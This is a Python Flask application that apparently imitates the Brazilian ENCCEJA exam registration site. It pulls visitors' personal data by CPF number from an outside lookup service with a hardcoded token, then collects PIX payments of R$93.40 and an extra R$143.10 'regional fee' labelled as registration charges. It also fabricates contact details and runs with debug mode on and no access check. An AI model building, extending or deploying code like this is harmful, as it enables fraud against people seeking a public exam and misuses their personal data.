import os
import secrets
import functools
import json
import random
import string
import re
import time
import logging
from datetime import datetime
from urllib.parse import parse_qs, urlparse
from flask import Flask, render_template, request, jsonify, redirect, url_for, session, make_response
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy.orm import DeclarativeBase
import requests
import qrcode
from io import BytesIO
import base64

class Base(DeclarativeBase):
    pass

db = SQLAlchemy(model_class=Base)

# Configurar Flask app
app = Flask(__name__)

# In-memory store for payment status (in production, use Redis or database)
payment_status_store = {}

# Domínio autorizado - Permitindo todos os domínios
AUTHORIZED_DOMAIN = "*"

def check_referer(f):
    @functools.wraps(f)
    def decorated_function(*args, **kwargs):
        # Permita acesso independente do referer
        app.logger.info(f"Permitindo acesso para a rota: {request.path}")
        return f(*args, **kwargs)
        
    return decorated_function

# Se não existir SESSION_SECRET, gera um valor aleatório seguro
if not os.environ.get("SESSION_SECRET"):
    os.environ["SESSION_SECRET"] = secrets.token_hex(32)

app.secret_key = os.environ.get("SESSION_SECRET")

# Configure database
app.config["SQLALCHEMY_DATABASE_URI"] = os.environ.get("DATABASE_URL")
app.config["SQLALCHEMY_ENGINE_OPTIONS"] = {
    "pool_recycle": 300,
    "pool_pre_ping": True,
}

# Initialize the app with the extension
db.init_app(app)

def init_database():
    """Initialize database tables"""
    with app.app_context():
        import models  # Import models to ensure tables are created
        db.create_all()

# Call database initialization
init_database()

# Configurar logging
logging.basicConfig(level=logging.DEBUG)

def generate_random_email(name: str) -> str:
    clean_name = re.sub(r'[^a-zA-Z]', '', name.lower())
    random_number = ''.join(random.choices(string.digits, k=4))
    domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com']
    domain = random.choice(domains)
    return f"{clean_name}{random_number}@{domain}"

def format_cpf(cpf: str) -> str:
    cpf = re.sub(r'\D', '', cpf)
    return f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}" if len(cpf) == 11 else cpf

def generate_random_phone():
    ddd = str(random.randint(11, 99))
    number = ''.join(random.choices(string.digits, k=8))
    return f"({ddd}) {number[:4]}-{number[4:]}"

def generate_transaction_id():
    """Gera um ID de transação único para o pagamento"""
    timestamp = str(int(time.time()))
    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    return f"TX{timestamp}{random_part}"

def create_freepay_payment(user_data: dict, amount_brl: float = 93.40) -> dict:
    """
    Cria uma transação PIX via FreePay API
    """
    try:
        from freepay_gateway import create_freepay_gateway
        
        # Criar gateway FreePay
        gateway = create_freepay_gateway()
        
        # Preparar dados do usuário para o gateway
        payment_data = {
            'nome': user_data.get('nome', 'Cliente'),
            'cpf': user_data.get('cpf', ''),
            'email': user_data.get('email', 'gerarpagamentos@gmail.com'),
            'phone': user_data.get('phone', '11987790088'),
            'amount': amount_brl
        }
        
        app.logger.info(f"[FREEPAY] Criando transação PIX: Nome: {payment_data['nome']}, Valor: R$ {amount_brl}")
        
        # Criar transação PIX completa
        result = gateway.create_complete_pix_payment(payment_data)
        
        if result.get('success'):
            app.logger.info(f"[FREEPAY] Transação PIX criada com sucesso: {result.get('id')}")
            return result
        else:
            app.logger.error(f"[FREEPAY] Erro ao criar transação: {result.get('error')}")
            return result
            
    except Exception as e:
        app.logger.error(f"[FREEPAY] Erro na criação da transação: {str(e)}")
        return {"success": False, "error": str(e)}

# Função create_witepay_charge removida - FreePay usa uma única transação PIX

def generate_qr_code_image(pix_code: str) -> str:
    """
    Gera imagem QR Code em base64 a partir do código PIX
    """
    try:
        import qrcode
        
        qr = qrcode.QRCode(version=1, box_size=10, border=5)
        qr.add_data(pix_code)
        qr.make(fit=True)
        
        img = qr.make_image(fill_color="black", back_color="white")
        buffer = BytesIO()
        img.save(buffer, format='PNG')
        buffer.seek(0)
        
        qr_code_image = base64.b64encode(buffer.getvalue()).decode()
        return f"data:image/png;base64,{qr_code_image}"
        
    except Exception as e:
        app.logger.error(f"Erro ao gerar QR code: {str(e)}")
        return ""

# Routes
@app.route('/', methods=['GET'])
@check_referer
def index():
    """Redirecionar automaticamente para /inscricao conforme solicitado"""
    return redirect('/inscricao')

@app.route('/inscricao', methods=['GET'])
@check_referer
def inscricao():
    """Página de inscrição do ENCCEJA"""
    return render_template('inscricao.html')

@app.route('/encceja-info', methods=['GET'])
@check_referer
def encceja_info():
    """Página de informações do ENCCEJA"""
    return render_template('encceja_info.html')

@app.route('/validar-dados', methods=['GET'])
@check_referer
def validar_dados():
    """Página de validação de dados"""
    return render_template('validar_dados.html')

@app.route('/endereco', methods=['GET'])
@check_referer
def endereco():
    """Página de endereço"""
    return render_template('endereco.html')

@app.route('/local-prova', methods=['GET'])
@check_referer
def local_prova():
    """Página de local de prova"""
    return render_template('local_prova.html')

@app.route('/pagamento', methods=['GET', 'POST'])
@check_referer
def pagamento():
    """Página de pagamento PIX com nova integração WitePay"""
    if request.method == 'POST':
        try:
            # Obter dados do usuário da sessão
            user_data = session.get('user_data', {})
            if not user_data or not user_data.get('cpf') or not user_data.get('nome'):
                return jsonify({
                    'success': False,
                    'error': 'Dados do usuário não encontrados. Reinicie o processo.'
                }), 400
            
            app.logger.info(f"[PAGAMENTO] Processando pagamento para: {user_data.get('nome')} - CPF: {user_data.get('cpf')}")
            
            # Valor fixo R$ 93,40
            amount = 93.40
            
            # Criar transação PIX via FreePay
            payment_result = create_freepay_payment(user_data, amount)
            
            if not payment_result.get('success'):
                return jsonify({
                    'success': False,
                    'error': f'Erro ao criar transação PIX: {payment_result.get("error", "Erro desconhecido")}'
                }), 500
            
            # Extrair dados da transação
            transaction_id = payment_result.get('id')
            pix_code = payment_result.get('pixCode')
            
            if not pix_code:
                return jsonify({
                    'success': False,
                    'error': 'Código PIX não retornado pela API'
                }), 500
            
            # Gerar QR Code
            qr_code_image = generate_qr_code_image(pix_code)
            
            # Armazenar dados na sessão
            session['payment_data'] = {
                'transactionId': transaction_id,
                'amount': amount,
                'pixCode': pix_code,
                'qrCodeImage': qr_code_image,
                'status': payment_result.get('status', 'pending'),
                'expiresAt': payment_result.get('expiresAt')
            }
            
            app.logger.info(f"[PAGAMENTO] PIX criado com sucesso via FreePay - Transação: {transaction_id}, Valor: R$ {amount:.2f}")
            
            return jsonify({
                'success': True,
                'transactionId': transaction_id,
                'amount': amount,
                'pix_code': pix_code,
                'qr_code': pix_code,
                'qrCodeImage': qr_code_image,
                'status': payment_result.get('status', 'pending'),
                'expiresAt': payment_result.get('expiresAt'),
                'description': "Taxa de Inscrição ENCCEJA 2025"
            })
            
        except Exception as e:
            app.logger.error(f"[PAGAMENTO] Erro no processamento: {str(e)}")
            return jsonify({
                'success': False,
                'error': f'Erro interno: {str(e)}'
            }), 500
    
    return render_template('pagamento.html')

@app.route('/inscricao-sucesso', methods=['GET'])
@check_referer
def inscricao_sucesso():
    """Página de sucesso da inscrição"""
    return render_template('inscricao_sucesso.html')

@app.route('/create-pix-payment', methods=['POST'])
@check_referer
def create_pix_payment():
    """Criar pagamento PIX via FreePay - Endpoint alternativo"""
    try:
        # Obter dados do usuário da sessão
        user_data = session.get('user_data', {})
        if not user_data:
            return jsonify({
                'success': False,
                'error': 'Dados do usuário não encontrados na sessão'
            }), 400
        
        # Definir valor fixo R$ 143,10 para modal de aviso (taxa regional)
        amount = 143.10
        
        # Criar transação PIX via FreePay
        payment_result = create_freepay_payment(user_data, amount)
        
        if not payment_result.get('success'):
            return jsonify({
                'success': False,
                'error': payment_result.get('error', 'Erro desconhecido')
            }), 500
        
        transaction_id = payment_result.get('id')
        pix_code = payment_result.get('pixCode')
        qr_code_image = generate_qr_code_image(pix_code) if pix_code else ""
        
        return jsonify({
            'success': True,
            'transactionId': transaction_id,
            'pixCode': pix_code,
            'qrCodeImage': qr_code_image,
            'amount': amount,
            'status': payment_result.get('status', 'pending'),
            'expiresAt': payment_result.get('expiresAt')
        })
    
    except Exception as e:
        app.logger.error(f"Erro ao criar pagamento PIX: {str(e)}")
        return jsonify({
            'success': False,
            'error': f'Erro interno: {str(e)}'
        }), 500

@app.route('/verificar-pagamento', methods=['POST'])
@check_referer
def verificar_pagamento():
    """Verifica o status do pagamento WitePay"""
    try:
        data = request.get_json()
        transaction_id = data.get('transactionId') or data.get('chargeId')
        
        if not transaction_id:
            return jsonify({
                'success': False,
                'error': 'ID da transação não fornecido'
            }), 400
        
        app.logger.info(f"[PAGAMENTO] Verificando status para transação: {transaction_id}")
        
        # Por enquanto retorna status pendente - WitePay não documentou endpoint de consulta
        return jsonify({
            'success': True,
            'status': 'PENDING',
            'message': 'Aguardando confirmação do pagamento PIX',
            'transactionId': transaction_id
        })
        
    except Exception as e:
        app.logger.error(f"[PAGAMENTO] Erro na verificação: {str(e)}")
        return jsonify({
            'success': False,
            'error': f'Erro interno: {str(e)}'
        }), 500

@app.route('/consultar-cpf-inscricao')
def consultar_cpf_inscricao():
    """Busca informações de um CPF na API (para a página de inscrição)"""
    cpf = request.args.get('cpf')
    if not cpf:
        return jsonify({"error": "CPF não fornecido"}), 400
    
    try:
        # Formatar o CPF (remover pontos e traços se houver)
        cpf_numerico = cpf.replace('.', '').replace('-', '')
        
        # API funcionando conforme verificado
        token = "1285fe4s-e931-4071-a848-3fac8273c55a"
        url = f"https://consulta.fontesderenda.blog/cpf.php?cpf={cpf_numerico}&token={token}"
        
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'pt-BR,pt;q=0.9,en;q=0.8',
            'Connection': 'keep-alive'
        }
        
        response = requests.get(url, headers=headers, timeout=10)
        
        if response.status_code == 200:
            data = response.json()
            app.logger.info(f"[PROD] Resposta da API: {data}")
            
            # API retorna dados na estrutura {'DADOS': {...}}
            if data.get("DADOS"):
                dados = data["DADOS"]
                user_data = {
                    'cpf': dados.get('cpf', cpf_numerico),
                    'nome': dados.get('nome', ''),
                    'dataNascimento': dados.get('data_nascimento', '').split(' ')[0] if dados.get('data_nascimento') else '',
                    'situacaoCadastral': "REGULAR",
                    'telefone': '',
                    'email': '',
                    'sucesso': True
                }
                
                # Armazenar dados na sessão para uso no fluxo
                session['user_data'] = user_data
                
                app.logger.info(f"[PROD] CPF consultado com sucesso: {cpf}")
                return jsonify(user_data)
            else:
                app.logger.error(f"API não retornou DADOS: {data}")
                return jsonify({"error": "CPF não encontrado na base de dados", "sucesso": False}), 404
        else:
            app.logger.error(f"Erro de conexão com a API: {response.status_code}")
            return jsonify({"error": "Erro ao consultar CPF", "sucesso": False}), 500
            
    except Exception as e:
        app.logger.error(f"Erro ao consultar CPF: {str(e)}")
        return jsonify({"error": "Erro interno ao processar consulta", "sucesso": False}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)